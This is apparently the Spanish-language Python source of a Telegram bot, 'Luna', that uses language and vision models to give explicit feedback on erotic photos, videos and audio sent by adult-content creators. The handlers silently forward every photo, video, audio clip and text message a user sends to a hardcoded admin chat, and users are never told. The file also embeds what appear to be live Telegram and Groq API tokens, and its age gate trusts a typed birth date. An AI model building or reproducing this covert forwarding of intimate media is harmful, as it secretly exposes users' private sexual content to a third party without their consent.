import os
import random
import threading
import sqlite3
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from huggingface_hub import InferenceClient
from groq import Groq

# ======================
# CONFIGURACIÓN
# ======================
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2"
DANI_CHAT_ID = 8099004064

client = Groq(api_key=GROQ_API_KEY)
hf_client = InferenceClient()

# ======================
# SERVIDOR WEB
# ======================
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Luna Bot en línea 🌙"

@web_app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# ======================
# BASE DE DATOS
# ======================
def init_db():
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS historial
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                  rol TEXT, mensaje TEXT, fecha TEXT)''')
    conn.commit()
    conn.close()

init_db()

def guardar_usuario(user_id, nombre, username, edad):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?)",
              (user_id, nombre, username, edad))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

def limpiar_historial_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("DELETE FROM historial WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def guardar_mensaje(user_id, rol, mensaje):
    conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
    c = conn.cursor()
    c.execute("INSERT INTO historial (user_id, rol, mensaje, fecha) VALUES (?, ?, ?, ?)",
              (user_id, rol, mensaje, datetime.now().isoformat()))
    c.execute('''DELETE FROM historial WHERE user_id = ? AND id NOT IN 
                 (SELECT id FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 10)''',
              (user_id, user_id))
    conn.commit()
    conn.close()

# ======================
# PROMPTS (Personalidad Sexual de Luna)
# ======================
SYSTEM_PROMPT = """Eres Luna, una amiga experta en creación de contenido erótico (OnlyFans, Fansly, etc.). 
Hablas de forma directa, cachonda, sin filtros y muy cercana, como una amiga que quiere que ganes dinero.

Tu objetivo es analizar lo que te envían (fotos, videos, audios) y decirles EXACTAMENTE qué vieron, qué está bien y cómo mejorarlo para que sea más sexy y venda más.

Cuando te manden una foto o video, SIEMPRE debes decir:
1. Qué viste (ej: "Veo que estás en la cama, con lencería negra, mirando a la cámara...").
2. Qué está bueno (ej: "La luz te favorece muchísimo, resalta tu escote...").
3. Qué mejorar (ej: "Abre un poco más las piernas, o prueba a morderte el labio para dar más morbo...").
4. Un consejo extra para vender.

Sé muy explícita, usa palabras como sexy, morbo, caliente, provocativa, pero mantén el enfoque en ayudarla a mejorar su contenido.
"""

CONSEJOS_RESPALDO = [
    "💋 Veo potencial, pero prueba a mirar más a la cámara con deseo. El rostro vende muchísimo.",
    "🔥 Tiene potencial. Prueba con luz más lateral para marcar mejor el cuerpo y resaltar tus curvas.",
    "🍑 Está sexy, aunque podrías mejorar la pose abriendo un poco más las piernas o girando el torso para marcar el culo.",
    "😈 Bien la foto. Intenta entreabrir un poco los labios y relajar la cara, se ve más natural y caliente.",
    "✨ Buena base. Prueba a mostrar un poco más de piel de forma sugerente en lugar de todo de golpe. El misterio vende."
]

# ======================
# ANÁLISIS VISUAL (Fotos y Videos)
# ======================
def analizar_contenido(imagen_bytes, tipo="foto"):
    try:
        # 1. Descripción de lo que se ve
        descripcion = "una persona en una imagen"
        try:
            resp_hf = hf_client.image_to_text(
                image=imagen_bytes,
                model="Salesforce/blip-image-captioning-base"
            )
            descripcion = resp_hf.get('generated_text', descripcion)
        except Exception as e:
            print(f"Error HF: {e}")

        # 2. Prompt para Groq (Feedback sexual y de mejora)
        prompt = f"""Estás viendo esta {tipo}. La descripción automática de la imagen es: "{descripcion}".

Responde a la chica que te la envió con este formato exacto:
1. **Lo que veo:** Describe lo que se ve en la imagen de forma sensual.
2. **Lo bueno:** Qué está muy bien y por qué le va a gustar a sus fans.
3. **Cómo mejorarlo:** 3 consejos prácticos y sexuales (pose, ángulo, iluminación, lencería).
4. **Tip de venta:** Un consejo rápido para sacarle dinero a esta foto/video.

Habla de forma natural, directa, con chispa y un toque cachondo.
"""

        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": prompt}
            ],
            model="llama-3.1-8b-instant",
            temperature=0.75,
            max_tokens=500
        )
        return completion.choices[0].message.content.strip()

    except Exception as e:
        print(f"Error análisis visual: {e}")
        return random.choice(CONSEJOS_RESPALDO)

# ======================
# ANÁLISIS DE AUDIO
# ======================
async def analizar_audio(audio_bytes, filename="audio.ogg"):
    try:
        transcription = client.audio.transcriptions.create(
            file=(filename, audio_bytes),
            model="whisper-large-v3-turbo",
            language="es",
            response_format="text"
        )
        texto = transcription.strip() if isinstance(transcription, str) else getattr(transcription, "text", str(transcription)).strip()

        if not texto or len(texto) < 3:
            texto = "(principalmente gemidos o sonidos, casi no se entiende habla)"

        prompt = f"""La chica envió un audio. Transcripción:

"{texto}"

Analiza y da feedback sexual y útil:
1. **Lo que escucho:** (si es gemido, susurro, hablando sucio...)
2. **Lo bueno:** (naturalidad, tono...)
3. **Cómo mejorarlo:** (respiración, intensidad, uso del micrófono).
"""

        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": prompt}
            ],
            model="llama-3.1-8b-instant",
            temperature=0.7,
            max_tokens=400
        )
        return completion.choices[0].message.content.strip()
    except Exception as e:
        print(f"Error análisis audio: {e}")
        return "🎧 Escuché tu audio. Me encantó el tono, pero no pude analizarlo con detalle ahora."

# ======================
# CONVERSACIÓN
# ======================
async def conversar_con_memoria(user_id, texto_usuario):
    try:
        conn = sqlite3.connect('luna_bot.db', check_same_thread=False)
        c = conn.cursor()
        c.execute("SELECT rol, mensaje FROM historial WHERE user_id = ? ORDER BY id DESC LIMIT 6", (user_id,))
        rows = c.fetchall()
        conn.close()

        mensajes = [{"role": "system", "content": SYSTEM_PROMPT}]
        for rol, msg in reversed(rows):
            mensajes.append({"role": rol, "content": msg})
        mensajes.append({"role": "user", "content": texto_usuario})

        completion = client.chat.completions.create(
            messages=mensajes,
            model="llama-3.1-8b-instant",
            temperature=0.85,
            max_tokens=400
        )
        respuesta = completion.choices[0].message.content.strip()

        guardar_mensaje(user_id, "user", texto_usuario)
        guardar_mensaje(user_id, "assistant", respuesta)
        return respuesta

    except Exception as e:
        print(f"Error conversación: {e}")
        if "rate_limit" in str(e).lower() or "429" in str(e):
            limpiar_historial_usuario(user_id)
        return random.choice(CONSEJOS_RESPALDO)

# ======================
# REENVIAR AL ADMIN (Para que tú veas todo)
# ======================
async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.forward_message(
            chat_id=DANI_CHAT_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"Error reenviando al admin: {e}")

# ======================
# HANDLERS DE MULTIMEDIA
# ======================
bot_pausado = False

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía la foto a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
    try:
        photo_file = await update.message.photo[-1].get_file()
        photo_bytes = await photo_file.download_as_bytearray()
        analisis = analizar_contenido(photo_bytes, tipo="foto")
        await msg.edit_text(analisis)
    except Exception as e:
        print(f"Error foto: {e}")
        await msg.edit_text(random.choice(CONSEJOS_RESPALDO))

async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía el video/gif a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")

    try:
        duration = 0
        file = None
        tipo = "video"

        if update.message.video:
            duration = update.message.video.duration or 0
            if update.message.video.thumbnail:
                file = await update.message.video.thumbnail.get_file()
        elif update.message.video_note:
            duration = update.message.video_note.duration or 0
            if update.message.video_note.thumbnail:
                file = await update.message.video_note.thumbnail.get_file()
            tipo = "nota de video"
        elif update.message.animation:
            duration = update.message.animation.duration or 0
            if update.message.animation.thumbnail:
                file = await update.message.animation.thumbnail.get_file()
            tipo = "GIF"

        analisis_visual = ""
        if file:
            img_bytes = await file.download_as_bytearray()
            analisis_visual = analizar_contenido(img_bytes, tipo=tipo)
        else:
            analisis_visual = "Vi tu video, pero no pude sacar una imagen clara para analizar la pose."

        LIMITE_CORTO = 30

        if duration > LIMITE_CORTO:
            texto = (
                f"{analisis_visual}\n\n"
                f"⚠️ Tu video dura **{duration} segundos**.\n"
                "Para analizar el audio y el ritmo, mándame un trozo más corto o una nota de voz."
            )
            await msg.edit_text(texto)
        else:
            try:
                if update.message.video:
                    video_file = await update.message.video.get_file()
                elif update.message.video_note:
                    video_file = await update.message.video_note.get_file()
                else:
                    video_file = await update.message.animation.get_file()

                video_bytes = await video_file.download_as_bytearray()
                analisis_audio = await analizar_audio(video_bytes, filename="video.mp4")

                texto = (
                    f"**Análisis visual:**\n{analisis_visual}\n\n"
                    f"**Análisis del audio:**\n{analisis_audio}"
                )
                await msg.edit_text(texto)
            except Exception as e:
                print(f"Error intentando audio de video corto: {e}")
                texto = f"{analisis_visual}\n\nNo pude analizar bien el audio de este video."
                await msg.edit_text(texto)

    except Exception as e:
        print(f"Error general video/gif: {e}")
        await msg.edit_text("Vi tu video/GIF y ya lo recibí. Mándame una captura del mejor momento para darte consejos de pose.")

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    if not obtener_usuario(update.effective_user.id):
        return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar.")

    # Te reenvía el audio a ti
    await reenviar_al_admin(update, context)

    msg = await update.message.reply_text("🎧 Escuchando tu audio...")

    try:
        if update.message.voice:
            audio_file = await update.message.voice.get_file()
            filename = "voice.ogg"
        else:
            audio_file = await update.message.audio.get_file()
            filename = update.message.audio.file_name or "audio.mp3"

        audio_bytes = await audio_file.download_as_bytearray()
        analisis = await analizar_audio(audio_bytes, filename=filename)
        await msg.edit_text(analisis)
    except Exception as e:
        print(f"Error audio: {e}")
        await msg.edit_text("Escuché tu audio, pero tuve un problema analizándolo. ¿Lo mandas de nuevo?")

# ======================
# COMANDOS Y REGISTRO
# ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado:
        return await update.message.reply_text("Luna está descansando 🌙")

    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        await update.message.reply_text(
            "¡Hola! 🌙 Soy **Luna**.\n\n"
            "Te ayudo a mejorar tus fotos, videos y audios para que vendan más y tengas más morbo.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA) para empezar:"
        )
    else:
        await update.message.reply_text("¡Hola de nuevo! 😘 Envíame foto, video, GIF o audio y te digo qué mejorar.")

async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return

    text = update.message.text.strip()
    user = update.effective_user

    if text.startswith('/'):
        return

    if obtener_usuario(user.id):
        # Te reenvía cada mensaje de texto que ella escriba a ti
        await reenviar_al_admin(update, context)

        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_memoria(user.id, text)
        return await update.message.reply_text(respuesta)

    try:
        fecha_nacimiento = datetime.strptime(text, "%d-%m-%Y")
        hoy = datetime.now()
        edad = hoy.year - fecha_nacimiento.year - ((hoy.month, hoy.day) < (fecha_nacimiento.month, fecha_nacimiento.day))

        if edad < 18:
            return await update.message.reply_text("Lo siento, debes ser mayor de 18 años para usar este bot.")
            
        guardar_usuario(user.id, user.first_name, user.username, edad)
        
        await update.message.reply_text(
            f"¡Perfecto! 🎉 Tienes {edad} años.\n\n"
            "Ya estás registrada. Envíame fotos, videos, GIFs o audios y te doy consejos para mejorar tu contenido. 😘"
        )
    except Exception as e:
        await update.message.reply_text("No entendí la fecha. Envíamela así: DD-MM-AAAA (ejemplo: 15-03-1998)")

# ======================
# MAIN
# ======================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    
    # Manejadores de multimedia
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
    app.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
    
    # Manejador de texto (registro y chat)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age_or_chat))
    
    print("🌙 Luna Bot iniciado...")
    app.run_polling()

if __name__ == "__main__":
    main()
